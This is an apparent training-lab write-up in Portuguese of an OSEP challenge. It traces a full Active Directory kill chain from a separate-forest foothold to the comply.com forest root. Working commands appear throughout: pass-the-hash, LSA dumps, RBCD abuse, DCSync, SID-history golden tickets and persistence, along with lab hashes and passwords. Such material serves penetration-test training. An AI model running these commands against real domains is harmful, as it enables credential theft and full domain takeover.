# OSEP Challenge 5 — Kill Chain

**Data:** 2026-04-28
**Objetivo:** Comprometer o forest root `comply.com` partindo de um foothold em `complyedge.com` (forest separado) e em `192.168.196.0/24` (rede DMZ).
**Resultado:** Forest root `comply.com` totalmente comprometido (krbtgt + Administrator extraídos via DCSync).

---

## Topologia

```
                    [Mac do operador]
                          │
                          │ ligolo (TCP)
                          ▼
              192.168.196.164 (web05) ── ligolo agent ───┐
                                                          │
                                                  ┌───────┴──────────┐
                                                  │                  │
                                       ┌──────────▼──────────┐  ┌────▼─────────────────────┐
                                       │  Forest A           │  │  Forest B (alvo)         │
                                       │  complyedge.com     │  │                          │
                                       │                     │  │  Root: comply.com        │
                                       │  DMZDC01            │  │   └── rdc02 (DC)         │
                                       │   172.16.196.168    │  │   172.16.114.160         │
                                       │   (Administrator OK)│  │                          │
                                       └─────────────────────┘  │  Child: ops.comply.com   │
                                              │                 │   ├── CDC07 (DC)         │
                                              │                 │   │   172.16.114.165     │
                                              │ trust forest-   │   ├── FILE06 (member)    │
                                              │ transitive      │   │   172.16.114.166     │
                                              │ bidirecional    │   └── JUMP09 (member)    │
                                              └────►────────────┤       172.16.114.167     │
                                                                └──────────────────────────┘
```

**Trusts relevantes:**

| Trust | Tipo | Direção | SID Filtering |
|---|---|---|---|
| `complyedge.com ↔ comply.com` | Forest-transitive (externo) | Bidirecional | **ATIVO** (default) |
| `comply.com ↔ ops.comply.com` | Parent/child (interno) | Bidirecional | **INATIVO** (default) |

Essa diferença é o ponto-chave de toda a engagement.

---

## Estado inicial (foothold já existente)

- Acesso à 192.168.196.0/24 direto; rota pra 172.16.114.0/24 via ligolo no `web05`.
- DMZDC01 já comprometido como `complyedge\Administrator` (senha `fgds90345SDfsw32`).
- Hashes do `complyedge.com` já tinham sido extraídos: `krbtgt`, `Administrator`, e `COMPLY$` (trust account).

---

## Fase 1 — Tentativa cross-forest (FALHOU por design)

**Hipótese inicial:** dado o trust forest-transitive bidirecional, fazer Golden Ticket no `complyedge.com` injetando SID History do `nicky` (Enterprise Admin do `comply.com`) e atacar o rdc02.

### 1.1 Inter-realm referral ticket via trust account

```bash
kerberos::golden /user:Administrator /domain:complyedge.com /sid:S-1-5-21-1416213050-106196312-571527550 /aes256:e8a1a626908f050dda89a3fe8a43506f0e12c80169df7393f119f33881eac23c /service:krbtgt /target:comply.com /ticket:trust_ticket.kirbi
```

```cmd
.\Rubeus.exe asktgs /ticket:trust_ticket.kirbi /service:cifs/rdc02.comply.com /dc:rdc02.comply.com /ptt
```

✅ TGS emitido. Acesso a `\\rdc02.comply.com\SYSVOL` OK.
❌ DCSync no `comply.com` retornou `ERROR_DS_DRA_ACCESS_DENIED (0x000020f7)` — Administrator@complyedge não tem direito de replicação no comply.

### 1.2 Golden ticket com SID History → bloqueado

```cmd
kerberos::golden /user:nicky /domain:complyedge.com /sid:<SID_complyedge> /krbtgt:<NTLM_complyedge_krbtgt> /sids:S-1-5-21-1135011135-3178090508-3151492220-1103 /ptt
```

❌ `KRB_AP_ERR_BAD_INTEGRITY` no rdc02. Causa: **SID Filtering ativo no trust forest-transitive** descarta o SID History injetado.

### 1.3 raiseChild via complyedge

```bash
raiseChild.py 'complyedge.com/Administrator:fgds90345SDfsw32'
```

✅ Extraiu hashes do `complyedge.com`.
❌ Etapa final no rdc02 falhou (PSEXEC: shares não graváveis + SID Filtering bloqueando o SID History do parent).

**Conclusão da Fase 1:** o caminho cross-forest direto está fechado. Precisa de pivô.

> **Lição:** Trust externo entre forests sempre tem **SID Filtering ON por default**. Não conta com SID History attack atravessando boundary de forest sem desabilitação explícita.

---

## Fase 2 — Pivô via member server (FILE06)

**Tática:** se o cross-forest está fechado, atacar lateralmente dentro do `ops.comply.com` (child do alvo) buscando uma conta privilegiada lá.

### 2.1 Admin local do FILE06 (Pwn3d!)

Hash `8821c97bc6b3d2aed6e30a9540f208f3` validado com `--local-auth`:

```bash
nxc smb 172.16.114.166 -u administrator -H 8821c97bc6b3d2aed6e30a9540f208f3 --local-auth
```

### 2.2 LSA dump → machine account hash

```bash
nxc smb 172.16.114.166 -u administrator -H 8821c97bc6b3d2aed6e30a9540f208f3 --local-auth --lsa
```

Achados-chave:
- `OPS\FILE06$` NTLM: `748d8b5ff6ad68c8f6064d2bd78f1739` (a senha da machine account)
- DCC2 cacheados de `nina`, `jim`, `Administrator`

> **Pegadinha:** machine accounts giram a senha automaticamente. Um hash extraído num dia anterior pode estar stale no dia seguinte. Sempre re-extrair antes de operações longas.

---

## Fase 3 — RBCD via FILE06$ → JUMP09

**Achado no BloodHound:** `FILE06$` tem `GenericWrite` no objeto `JUMP09`.
**Plano:** Resource-Based Constrained Delegation — criar machine account fake, configurar RBCD no JUMP09, S4U2Self+S4U2Proxy pra impersonar Administrator no JUMP09.

### 3.1 Criar machine account controlada

```bash
bloodyAD --dc-ip 172.16.114.165 -d ops.comply.com -u 'FILE06$' -p ':748d8b5ff6ad68c8f6064d2bd78f1739' add computer FAKEPC 'FakePass123!'
```

### 3.2 Configurar `msDS-AllowedToActOnBehalfOfOtherIdentity` em JUMP09$

```bash
bloodyAD --dc-ip 172.16.114.165 -d ops.comply.com -u 'FILE06$' -p ':748d8b5ff6ad68c8f6064d2bd78f1739' add rbcd 'JUMP09$' 'FAKEPC$'
```

> **Pegadinha:** o `set object` do bloodyAD não consegue serializar security descriptors automaticamente. Use o subcomando dedicado `add rbcd` ou o `rbcd.py` do impacket.

### 3.3 S4U2Self + S4U2Proxy → ticket como Administrator

```bash
getST.py -spn cifs/JUMP09.ops.comply.com -impersonate Administrator -dc-ip 172.16.114.165 'ops.comply.com/FAKEPC$:FakePass123!'
```

### 3.4 Dump do JUMP09

```bash
export KRB5CCNAME="$(pwd)/Administrator@cifs_JUMP09.ops.comply.com@OPS.COMPLY.COM.ccache" && secretsdump.py -k -no-pass -dc-ip 172.16.114.165 ops.comply.com/Administrator@JUMP09.ops.comply.com
```

**Achado decisivo no LSA do JUMP09:**

```
[*] DefaultPassword
ops.comply.com\Pete:0998ASDaas2
```

Cleartext do PETE direto via autologon configurado no JUMP09. Esse foi o atalho que destravou tudo.

---

## Fase 4 — DCSync no child (Pete = Domain Admin do ops.comply.com)

```bash
secretsdump.py -just-dc -dc-ip 172.16.114.165 'ops.comply.com/pete:0998ASDaas2@cdc07.ops.comply.com'
```

Extraído:
- `ops.comply.com\krbtgt` NTLM `7c7865e6e30e54e8845aad091b0ff447`
- `ops.comply.com\Administrator` NTLM `818eb2fc9965b91a34a454059403f24d`
- Domain SID do ops: `S-1-5-21-2032401531-514583578-4118054891` (via `lookupsid.py`)

---

## Fase 5 — Child → Parent SID History

Aqui está a chave teórica: **trust parent/child interno do mesmo forest NÃO tem SID Filtering por default**. Diferente da Fase 1, agora podemos forjar um Golden Ticket no child injetando SID History do Enterprise Admins do parent, e o KDC do parent vai **aceitar**.

### 5.1 raiseChild.py automatizado

```bash
raiseChild.py 'ops.comply.com/pete:0998ASDaas2'
```

O `raiseChild` faz internamente:
1. DCSync no child para extrair `krbtgt/ops.comply.com`.
2. Forja TGT no `ops.comply.com` com `extra-sid = <SID_comply.com>-519` (Enterprise Admins do parent).
3. Pede TGS via inter-realm referral ao KDC do parent.
4. SID Filtering inativo → KDC do parent honra o SID History → ticket válido como EA.
5. Executa DCSync no `comply.com` automaticamente.

**Output (forest pwn):**

```
comply.com/krbtgt:502:aad3b435...:b03491290492036a4ce26d9221d8978b:::
comply.com/krbtgt:aes256-cts-hmac-sha1-96s:868ac2e97c2763a09054d54d2767636a2e0c027ea3c9eea6efba61d1dff3c370
comply.com/Administrator:500:aad3b435...:069c3e9d2a2945f9f8c89457e395a949:::
comply.com/Administrator:aes256-cts-hmac-sha1-96s:45d2a23c12cbb75799767deb3b1b92e7ce8950e61a423bf2a5a919e6cb734000
```

### 5.2 (Equivalente manual, pra entendimento)

```bash
ticketer.py -nthash 7c7865e6e30e54e8845aad091b0ff447 -domain-sid S-1-5-21-2032401531-514583578-4118054891 -domain ops.comply.com -extra-sid S-1-5-21-1135011135-3178090508-3151492220-519 Administrator
```

```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache" && secretsdump.py -k -no-pass -just-dc -dc-ip 172.16.114.160 'ops.comply.com/Administrator@rdc02.comply.com'
```

> **Pegadinha do impacket:** ao chamar secretsdump cross-realm, **declare a identidade no realm de origem do ticket** (`ops.comply.com/Administrator@rdc02.comply.com`), não no realm de destino. Caso contrário ele tenta pegar TGT novo no parent e cai em `KDC_ERR_PREAUTH_FAILED`.

---

## Fase 6 — Persistência / pós-exploração

Com o `krbtgt` do forest root, golden tickets ilimitados:

```bash
ticketer.py -nthash b03491290492036a4ce26d9221d8978b -domain-sid S-1-5-21-1135011135-3178090508-3151492220 -domain comply.com Administrator
```

```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache" && psexec.py -k -no-pass -dc-ip 172.16.114.160 'comply.com/Administrator@rdc02.comply.com'
```

Golden ticket como `nicky` (alvo originalmente bloqueado na Fase 1):

```bash
ticketer.py -nthash b03491290492036a4ce26d9221d8978b -domain-sid S-1-5-21-1135011135-3178090508-3151492220 -domain comply.com -user-id 1103 nicky
```

---

## Resumo visual do kill chain

```
[Foothold complyedge\Administrator]
        │
        │ Fase 1: cross-forest SID History
        │    ❌ bloqueado por SID Filtering
        │
        ▼
[FILE06 admin local — Pwn3d!]
        │
        │ Fase 2: LSA dump → FILE06$ machine hash
        │
        ▼
[FILE06$ tem GenericWrite no JUMP09]
        │
        │ Fase 3: RBCD (FAKEPC$ → JUMP09)
        │    + S4U2Self/Proxy como Administrator
        │
        ▼
[Admin no JUMP09]
        │
        │ Fase 3.4: LSA DefaultPassword
        │
        ▼
[Pete cleartext: 0998ASDaas2]
        │
        │ Fase 4: DCSync no CDC07
        │    (Pete = DA do ops.comply.com)
        │
        ▼
[krbtgt do ops.comply.com]
        │
        │ Fase 5: Child→Parent SID History
        │    (trust interno = SEM SID Filtering)
        │
        ▼
[krbtgt do comply.com] ← FOREST PWNED
```

---

## Mapeamento MITRE ATT&CK

| Fase | Técnica | ID |
|---|---|---|
| 1 | Forge Kerberos Tickets: Golden Ticket | T1558.001 |
| 1 | SID-History Injection | T1134.005 |
| 2 | OS Credential Dumping: LSA Secrets | T1003.004 |
| 2 | OS Credential Dumping: Cached Domain Credentials | T1003.005 |
| 3 | Use Alternate Authentication Material: PtH | T1550.002 |
| 3 | Domain Account Manipulation: AddComputer | T1098.x |
| 3 | Resource-Based Constrained Delegation abuse | T1558.x |
| 4 | OS Credential Dumping: DCSync | T1003.006 |
| 5 | SID-History Injection (cross-domain intra-forest) | T1134.005 |
| 6 | Forge Kerberos Tickets: Golden Ticket | T1558.001 |

---

## Lições para futuras engagements

1. **Trust externo ≠ trust interno.** SID Filtering é o default em trust forest-transitive (entre forests separados) e desabilitado em trust parent/child do mesmo forest. Sempre identifique o tipo de trust antes de planejar SID History.
2. **Machine account hashes giram.** Antes de rodar uma operação longa baseada num hash de machine account capturado anteriormente, revalide.
3. **DefaultPassword no LSA é ouro.** Servidores configurados com autologon (registry `Winlogon\DefaultPassword`) deixam credenciais em cleartext expostas via `--lsa`. Prioritário em qualquer pivô.
4. **Cross-realm no impacket precisa da identidade declarada no realm correto.** Identifique seu principal pelo realm que emitiu o TGT, não pelo realm do alvo.
5. **`raiseChild.py` automatiza Child→Parent end-to-end.** Útil quando o impacket trava na transição cross-realm; encapsula DCSync + ticketer + dump numa chamada.
6. **`bloodyAD set object` não serializa security descriptors.** Use o subcomando dedicado (`add rbcd`, `add shadowCredentials`) ou caia pra impacket (`rbcd.py`).
